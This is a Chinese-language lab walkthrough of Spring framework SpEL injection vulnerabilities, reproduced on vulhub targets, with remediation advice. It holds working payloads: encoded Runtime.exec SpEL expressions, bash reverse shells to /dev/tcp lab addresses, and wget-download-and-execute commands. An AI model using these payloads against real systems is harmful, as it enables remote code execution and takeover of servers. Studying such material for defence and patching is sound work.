# Spring框架漏洞总结
## Spring简介

Spring是Java EE编程领域的一个轻量级开源框架，该框架由一个叫Rod Johnson的程序员在2002年最早提出并随后创建，是为了解决企业级编程开发中的复杂性，业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用，实现敏捷开发的应用型框架。框架的主要优势之一就是其分层架构，分层架构允许使用者选择使用哪一个组件，同时为J2EE应用程序开发提供集成的框架。

2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。类比Struts2框架，会发现绝大部分的安全漏洞都和OGNL脱不了干系。尤其是远程命令执行漏洞，这导致Struts2越来越不受待见。

因此，Spring引入SpEL必然增加安全风险。事实上，过去多个Spring CVE都与其相关，如CVE-2017-8039、CVE-2017-4971、CVE-2016-5007、CVE-2016-4977等。

**SpEL是什么**

SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。就使用方法上来看，一共分为三类，分别是直接在注解中使用，在XML文件中使用和直接在代码块中使用。

SpEL原理如下∶

1. 表达式:可以认为就是传入的字符串内容
2. 解析器︰将字符串解析为表达式内容
3. 上下文:表达式对象执行的环境
4. 根对象和活动上下文对象∶根对象是默认的活动上下文对象，活动上下文对象表示了当前表达式操作的对象
    

参考链接：http://rui0.cn/archives/1043

## Spring框架特征

1.看web应用程序的ico小图标，是一个小绿叶子

![图片](_v_images/20210905145337441_6580_1)

2.看报错页面，如果默认报错页面没有修复，那就是长这样

![图片](_v_images/20210905145337328_1532_1)

3.wappalyzer插件识别

![图片](_v_images/20210905145337217_27556_1)

4.f12看X-Application-Context头

![图片](_v_images/20210905145337103_3286_1)

## 本地环境搭建

### 安装IDEA

官网下载安装包 ：

https://www.jetbrains.com/idea/download/#section=windows

这里选择的商业版，免费试用30天

![图片](_v_images/20210905145336992_19370_1)

![图片](_v_images/20210905145336881_11020_1)

安装目录默认

![图片](_v_images/20210905145336767_19969_1)

报错不用管，点击确认，一直默认下一步

![图片](_v_images/20210905145336653_26551_1)

双击下图图标

![图片](_v_images/20210905145336542_3954_1)

![图片](_v_images/20210905145336429_17229_1)

![图片](_v_images/20210905145336314_27426_1)

![图片](_v_images/20210905145336202_27188_1)

![图片](_v_images/20210905145336089_4561_1)

![图片](_v_images/20210905145335976_28374_1)

![图片](_v_images/20210905145335866_11387_1)

选择Download SDK

![图片](_v_images/20210905145335755_15524_1)

选择jdk1.8

![图片](_v_images/20210905145335642_28594_1)

![图片](_v_images/20210905145335529_4001_1)

![图片](_v_images/20210905145335417_4662_1)

点next

![图片](_v_images/20210905145335305_16492_1)

点击Spring Web

![图片](_v_images/20210905145335191_18580_1)

等待安装

![图片](_v_images/20210905145335076_13036_1)

点击右上角启动，可以看见默认端口8080

![图片](_v_images/20210905145334963_2248_1)

成功访问，部署成功

![图片](_v_images/20210905145334852_15871_1)

这里复现的环境搭建均采用p牛的vulhub靶场环境。

## Spring渗透总结

### 1.Spring Security OAuth2 远程命令执行（CVE-2016-4977）

#### 漏洞简介

Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块。Spring Security OAuth2处理认证请求的时候如果使用了whitelabel views，response\_type参数值会被当做Spring SpEL来执行，攻击者可以在被授权的情况下通过构造response\_type值也就是通过构造恶意SpEL表达式可以触发远程代码执行漏洞。故是在需要知道账号密码的前提下才可以利用该漏洞。

#### 影响版本

```
2.0.0-2.0.91.0.0-1.0.5
```

#### 漏洞验证

启动漏洞

![图片](_v_images/20210905145334741_15427_1)

访问url

![图片](_v_images/20210905145334629_1249_1)

输入下面的漏洞测试url：

```
http://192.168.173.144:8080/oauth/authorize?response_type=${2*2}&client_id=acme&scope=openid&redirect_uri=http://test
```

访问后会弹窗，输入用户名和密码 admin:admin即可，返回结果可以看到值被成功计算为2*2=4

![图片](_v_images/20210905145334518_31680_1)

![图片](_v_images/20210905145334408_1830_1)

页面返回执行了我们输入的SpEL表达式，这里可以看作是SpEL表达式的注入，既然表达式被执行了，我们可以考虑代码注入的可能性。

#### 漏洞复现

这里看一下vulhub提供的poc，poc地址：

https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py

```
#!/usr/bin/env python
```

![图片](_v_images/20210905145334299_18378_1)

可以看出该poc对输入的命令进行了变形，将命令的每个字符串转化为ASCII码配合tostring()方法并且用concat拼接传入exec执行。

反弹shell：

对于poc需要先进行base64编码(java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符,重定向，空格，管道符都有可能造成错误，具体可以参考这篇文章：

https://blog.th3wind.xyz/posts/238052750.html）

在线生成有效载荷的网站：

http://www.jackson-t.ca/runtime-exec-payloads.html

```
bash -i >& /dev/tcp/192.168.173.133/1234 0>&1
```

![图片](_v_images/20210905145334188_12921_1)

生成poc

```
${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}
```

![图片](_v_images/20210905145334074_14818_1)

修改后的url：

```
http://192.168.173.144:8080/oauth/authorize?response_type=${poc的位置}&client_id=acme&scope=openid&redirect_uri=http://test
```

```
http://192.168.173.144:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&client_id=acme&scope=openid&redirect_uri=http://test
```

监听端口：

![图片](_v_images/20210905145333962_4481_1)

执行url，看见如图的显示页面说明已成功执行：

![图片](_v_images/20210905145333852_13735_1)

![图片](_v_images/20210905145333743_23964_1)

反弹shell成功。

#### 安全防护

1．使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用Whitelabel这个视图。  
2．使用2.0.x版本的用户升级到2.0.10以及更高的版本

因为对java不是很熟，所以没有对底层原理进行分析，但是发现一篇文章分析的还是蛮好的，大家可以看一下：

https://blog.knownsec.com/2016/10/spring-security-oauth-rce/

### 2.Spring Web Flow框架远程代码执行(CVE-2017-4971)

#### 漏洞简介

Spring Web Flow是Spring的一个子项目，主要目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题，提供了描述业务流程的抽象能力。

Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。

#### 影响版本

```
Spring WebFlow 2.4.0 - 2.4.4
```

#### 触发条件

1. MvcViewFactoryCreator对象的useSpringBeanBinding参数需要设置为false（默认值）
    
2. flow view对象中设置BinderConfiguration对象为空
    

#### 漏洞复现

开启漏洞

![图片](_v_images/20210905145333632_32372_1)

![图片](_v_images/20210905145333518_19789_1)

点击login

![图片](_v_images/20210905145333406_5441_1)

可以看见这里有很多默认的用户名密码，随便选一组登录系统

![图片](_v_images/20210905145333296_1933_1)

然后访问id为1的酒店地址：

```
http://192.168.173.144:8080/hotels/1
```

![图片](_v_images/20210905145333183_13271_1)

点击预订按钮”Book Hotel”，填写相关信息后点击“ Process”(从这一步，其实WebFlow就正式开始了)︰

![图片](_v_images/20210905145333070_15463_1)

随便输入一些内容后，我们点击Proceed然后会跳转到Confirm页面（Credit Card为16位）：

![图片](_v_images/20210905145332959_28055_1)

点击confirm时进行抓包

![图片](_v_images/20210905145332850_5509_1)

![图片](_v_images/20210905145332743_17241_1)

反弹shell的poc：

```
原POC:
```

![图片](_v_images/20210905145332627_3473_1)

exp扩展

> 1、向里面写入文件
> 
> ```
> &_T(java.lang.Runtime).getRuntime().exec("touch /tmp/zcc")
> ```
> 
> ![图片](_v_images/20210905145332515_7993_1)
> 
> ![图片](_v_images/20210905145332405_21405_1)
> 
> 2、使用wget下载远程bash脚本
> 
> ```
> &_T(java.lang.Runtime).getRuntime().exec("/usr/bin/wget -qO /tmp/shell http://x.x.x.x:xxxx/shell")
> ```
> 
> 3、执行上一步下载的脚本
> 
> ```
> &_T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/shell")
> ```

#### 安全防护

官方已经发布了新版本，请受影响的用户及时更新升级至最新的版本来防护该漏洞。官方同时建议用户应该更改数据绑定的默认设置来确保提交的表单信息符合要求来规避类似恶意行为。参考链接:

**https://pivotal.io/security/cve-2017-4971**

对于这个漏洞的底层分析文章，大家可以看看这篇：

https://paper.seebug.org/322/

### 3.Spring Data Rest远程命令执行命令(CVE-2017-8046)

#### 漏洞简介

Spring-data-rest服务器在处理PATCH请求时，攻击者可以构造恶意的PATCH请求并发送给spring-date-rest服务器，通过构造好的JSON数据来执行任意Java代码。

#### 影响版本

```
Spring Data REST versions < 2.5.12, 2.6.7, 3.0 RC3Spring Boot version < 2.0.0M4Spring Data release trains < Kay-RC3
```

#### 漏洞验证

开启漏洞环境：

![图片](_v_images/20210905145332294_1608_1)

![图片](_v_images/20210905145332182_16371_1)

看到 json格式的返回值，说明这是一个 Restful风格的API服务器。

访问如下url，如果有下面回显，则说明存在该漏洞：

```
http://192.168.173.144:8080/customers/1
```

![图片](_v_images/20210905145332072_10619_1)

#### 漏洞复现

bp抓包，并且使用PATCH请求来修改：

![图片](_v_images/20210905145331960_6641_1)

创建文件touch /tmp/zcc的poc，需要对其进行十进制编码：

```
",".join(map(str, (map(ord,"touch /tmp/zcc"))))
```

![图片](_v_images/20210905145331849_11338_1)

将该编码写入poc，放入请求包，注意json格式的poc上面留一个空行，Content-Type: 为application/json-patch+json

```
PATCH /customers/1 HTTP/1.1
```

![图片](_v_images/20210905145331738_4836_1)  

成功写入：

![图片](_v_images/20210905145331628_18151_1)

反弹shell的poc，先进行base64编码：

```
bash -i >& /dev/tcp/192.168.173.1234/8888 0>&1
```

![图片](_v_images/20210905145331518_30721_1)  

![图片](_v_images/20210905145331407_10988_1)

写入poc，成功反弹。

#### 安全防护

升级到以下最新版本：  
\* Spring Data REST 2.5.12, 2.6.7, 3.0 RC3  
\* Spring Boot 2.0.0.M4  
\* Spring Data release train Kay-RC3

对于该漏洞底层原理分析的文章可以参考这一篇：

https://blog.spoock.com/2018/05/22/cve-2017-8046/

### 4.Spring Messaging远程命令执行突破(CVE-2018-1270)

#### 漏洞简介

spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，STOMP消息代理在处理客户端消息时存在SpEL表达式注入漏洞，在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。

#### 影响版本

```
Spring Framework 5.0 - 5.0.5Spring Framework 4.3 - 4.3.15已不支持的旧版本仍然受影响
```

#### 漏洞验证

开启漏洞

![图片](_v_images/20210905145331197_17897_1)

![图片](_v_images/20210905145331090_5362_1)

访问该页面：

```
http://192.168.173.144:8080/gs-guide-websocket
```

![图片](_v_images/20210905145330980_2650_1)

#### 漏洞复现

对反弹shell的命令base64编码：

```
bash -i >& /dev/tcp/192.168.173.133/1234 0>&1
```

创建exp.py,自行修改ip和命令语句：

```
#!/usr/bin/env python3
```

![图片](_v_images/20210905145330872_2680_1)

![图片](_v_images/20210905145330758_27901_1)

成功反弹。

#### 安全防护

1.请升级Spring框架到最新版本(5.0.5、4.3.15及以上版本);

2.如果你在用 SpringBoot，请升级到最新版本(2.0.1及以上版本);

对于底层原理进行分析的文章可以参考这一篇：

https://paper.seebug.org/562/

### 5.Spring Data Commons远程命令执行漏洞(CVE-2018-1273)

#### 漏洞简介

Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。

#### 影响版本

```
Spring Data Commons 1.13 – 1.13.10 (Ingalls SR10)Spring Data REST 2.6 – 2.6.10(Ingalls SR10)Spring Data Commons 2.0 – 2.0.5 (Kay SR5)Spring Data REST 3.0 – 3.0.5(Kay SR5)官方已经不支持的旧版本
```

#### 漏洞验证

启动漏洞

![图片](_v_images/20210905145330648_15091_1)

![图片](_v_images/20210905145330538_24181_1)

#### 漏洞复现

访问该url，bp抓包

```
http://192.168.173.144:8080/users
```

![图片](_v_images/20210905145330427_9227_1)

![图片](_v_images/20210905145330318_23827_1)

加上poc的请求包如下：

```
POST /users?page=&size=5 HTTP/1.1
```

![图片](_v_images/20210905145330203_17488_1)

![图片](_v_images/20210905145330093_2270_1)

成功写入。

反弹shell：

写一个shell.sh文件，开启http服务：

![图片](_v_images/20210905145329983_9446_1)

![图片](_v_images/20210905145329876_29912_1)

下载执行sh脚本：

```
/usr/bin/wget -qO /tmp/shell.sh http://192.168.173.131/shell.sh
```

![图片](_v_images/20210905145329767_8698_1)

![图片](_v_images/20210905145329658_20889_1)

![图片](_v_images/20210905145329547_27396_1)

执行shell.sh

```
/bin/bash /tmp/shell.sh
```

![图片](_v_images/20210905145329395_17853_1)

成功反弹。

#### 安全防护

1. 受影响版本的用户应该应用以下缓解措施：
    

- 2.0.x用户应该升级到2.0.6
    
- 1.13.x用户应该升级到1.13.11
    
- 旧版本应升级到受支持的分支
    

已解决此问题的发布版本包括：

- Spring Data REST 2.6.11（Ingalls SR11）
    
- Spring Data REST 3.0.6（Kay SR6）
    
- Spring Boot 1.5.11
    
- Spring Boot 2.0.1
    

1. 使用Spring Security提供的身份验证和授权，限定特定访问。
    

对于该漏洞的底层原理分析可以看该文章：https://www.cnblogs.com/hac425/p/9656747.html  

![图片](_v_images/20210905145329286_1819_1)

小程序，![](_v_images/20210905145328991_6849_1)FreeBuf+，，FreeBuf+小程序：把安全装进口袋小程序